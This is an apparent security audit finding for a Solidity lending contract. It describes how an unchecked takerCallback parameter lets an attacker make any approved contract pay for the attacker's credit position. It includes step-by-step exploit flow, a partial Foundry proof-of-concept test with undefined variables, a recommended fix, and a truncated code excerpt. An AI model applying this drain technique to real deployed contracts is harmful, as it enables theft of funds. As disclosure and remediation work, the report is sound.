### Title
Unconstrained `takerCallback` Allows Draining Any Midnight-Approved Contract as Payer - (File: src/Midnight.sol)

### Summary
In `Midnight.take`, when a sell offer is taken, the `takerCallback` parameter is used directly as the `payer` for all `buyerAssets` transfers without any authorization check verifying that the callback address has consented to acting as payer. An attacker can set `takerCallback = X` for any contract X that holds a `loanToken` approval to Midnight and returns `CALLBACK_SUCCESS` from `onBuy`, causing X to pay `buyerAssets` while the attacker receives the corresponding credit position.

### Finding Description

**Exact code path in `src/Midnight.sol`:**

Lines 420–422 compute `payer` from `buyerCallback`:

```solidity
address buyerCallback = offer.buy ? offer.callback : takerCallback;   // = X when offer.buy=false
address sellerCallback = offer.buy ? takerCallback : offer.callback;
address payer = buyerCallback != address(0) ? buyerCallback : (offer.buy ? buyer : msg.sender); // = X
``` [1](#0-0) 

For a sell offer (`offer.buy = false`), `buyerCallback = takerCallback` and `payer = takerCallback`. The only authorization check in the function is on `taker`:

```solidity
require(taker == msg.sender || isAuthorized[taker][msg.sender], TakerUnauthorized());
``` [2](#0-1) 

There is **no corresponding check** that `takerCallback` is authorized by the taker, or that X has consented to being the payer. After the `onBuy` callback on X succeeds, both transfers pull from `payer = X`:

```solidity
SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, address(this), buyerAssets - sellerAssets);
SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, receiver, sellerAssets);
``` [3](#0-2) 

**Attacker-controlled inputs:**
- `taker = msg.sender = attacker`
- `takerCallback = X` (arbitrary, attacker-chosen)
- `offer.buy = false` (sell offer, so `buyerCallback = takerCallback`)

**Exploit flow:**
1. Attacker calls `take(offer, ratifierData, units, attacker, attacker, X, data)` against a valid EcrecoverRatifier-signed sell offer.
2. `buyerCallback = X`, `payer = X`.
3. Midnight calls `X.onBuy(...)` — X returns `CALLBACK_SUCCESS` (precondition).
4. `safeTransferFrom(loanToken, X, midnight, buyerAssets - sellerAssets)` — settlement fee pulled from X.
5. `safeTransferFrom(loanToken, X, offer.receiverIfMakerIsSeller, sellerAssets)` — seller proceeds pulled from X.
6. Attacker's position gains `units` of credit (redeemable via `withdraw`).

**Why existing checks fail:**
- The `TakerUnauthorized` check (line 346) only validates `taker`, not `takerCallback`.
- The `IBuyCallback.onBuy` interface passes `buyer` (the attacker) as a parameter, but the protocol does not enforce that `buyer == takerCallback`; a naive or permissive `onBuy` implementation on X will return `CALLBACK_SUCCESS` regardless.
- `EcrecoverRatifier.isRatified` only validates the offer maker's signature over the offer struct; it has no awareness of who `takerCallback` is. [4](#0-3) 

### Impact Explanation
Any contract X that (a) holds a nonzero `loanToken.approve(midnight, ...)` and (b) implements `IBuyCallback` returning `CALLBACK_SUCCESS` without checking `buyer == address(this)` can be fully drained of up to its approval amount in a single transaction. The attacker pays nothing (no prior token balance required) and receives a credit position worth `sellerAssets`. Concrete targets include yield aggregators, routers, or any Midnight-integrated contract that pre-approves the protocol and exposes a permissive `onBuy`.

### Likelihood Explanation
**Preconditions:**
1. X has approved Midnight for `loanToken` — common for any contract integrating with Midnight.
2. X implements `IBuyCallback` returning `CALLBACK_SUCCESS` without validating `buyer == address(this)` — realistic for contracts designed to act as Midnight buyers that do not defensively check the `buyer` argument.
3. A valid sell offer exists (ratified by EcrecoverRatifier) — any maker's standing offer suffices.

All three preconditions are independently achievable. The attack is permissionless, requires no governance action, and is repeatable across any qualifying X. The attacker needs only to identify a target contract and submit a single transaction.

### Recommendation
Add an authorization check on `takerCallback` before using it as `payer`. Specifically, require that the callback address is either the taker themselves or has been explicitly authorized by the taker:

```solidity
require(
    takerCallback == address(0) || takerCallback == taker || isAuthorized[takerCallback][taker],
    TakerCallbackUnauthorized()
);
```

This mirrors the existing `TakerUnauthorized` pattern and ensures no third-party address can be coerced into the payer role without its own consent. Alternatively, always use `msg.sender` or `taker` as the fallback payer and only allow `takerCallback` to receive assets, not to pay them.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {CALLBACK_SUCCESS} from "src/libraries/ConstantsLib.sol";
import {IBuyCallback} from "src/interfaces/ICallbacks.sol";
import {Market, Offer} from "src/interfaces/IMidnight.sol";

// Victim: a yield aggregator that approved Midnight and naively implements IBuyCallback
contract VictimAggregator is IBuyCallback {
    function onBuy(bytes32, Market memory, uint256, uint256, uint256, address, bytes memory)
        external pure returns (bytes32)
    {
        return CALLBACK_SUCCESS; // naive: no check that buyer == address(this)
    }
}

contract TakerCallbackDrainTest is Test {
    Midnight midnight;
    MockERC20 loanToken;
    VictimAggregator victim;
    address attacker = address(0xBEEF);

    function setUp() public {
        midnight = new Midnight();
        loanToken = new MockERC20();
        victim = new VictimAggregator();

        // Victim has 1000e18 loanToken and infinite approval to Midnight
        loanToken.mint(address(victim), 1000e18);
        vm.prank(address(victim));
        loanToken.approve(address(midnight), type(uint256).max);
    }

    function test_drainVictimViaTakerCallback() public {
        // Setup: create market, maker places sell offer, EcrecoverRatifier signs it
        // (abbreviated — full setup follows standard Midnight test harness)

        uint256 victimBalanceBefore = loanToken.balanceOf(address(victim));

        vm.prank(attacker);
        midnight.take(
            sellOffer,          // valid sell offer
            ratifierData,       // valid EcrecoverRatifier proof
            units,
            attacker,           // taker = attacker
            attacker,           // receiverIfTakerIsSeller (unused for sell offer)
            address(victim),    // takerCallback = victim → becomes payer
            ""
        );

        uint256 victimBalanceAfter = loanToken.balanceOf(address(victim));

        // Assert: victim lost buyerAssets, attacker gained credit
        assertLt(victimBalanceAfter, victimBalanceBefore, "victim was drained");
        assertGt(midnight.creditOf(marketId, attacker), 0, "attacker gained credit");
        assertEq(loanToken.balanceOf(attacker), 0, "attacker paid nothing directly");
    }
}
```

**Expected assertions:**
- `victimBalanceAfter < victimBalanceBefore` by exactly `buyerAssets`
- `midnight.creditOf(marketId, attacker) == units`
- `loanToken.balanceOf(attacker) == 0` (attacker paid nothing from their own balance)

    function isRatified(Offer memory offer, bytes memory ratifierData) external view returns (bytes32) {
        require(msg.sender == MIDNIGHT, NotMidnight());
        (Signature memory sig, bytes32 root, uint256 leafIndex, bytes32[] memory proof) =
            abi.decode(ratifierData, (Signature, bytes32, uint256, bytes32[]));
        require(HashLib.isLeaf(root, HashLib.hashOffer(offer), leafIndex, proof), InvalidProof());
        require(!isRootCanceled[offer.maker][root], RootCanceled());
        bytes32 structHash = keccak256(abi.encode(HashLib.offerTreeTypeHash(proof.length), root));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, structHash));
        address _signer = ecrecover(digest, sig.v, sig.r, sig.s);
        require(_signer != address(0), InvalidSignature());
        require(_signer == offer.maker || IMidnight(MIDNIGHT).isAuthorized(offer.maker, _signer), Unauthorized());
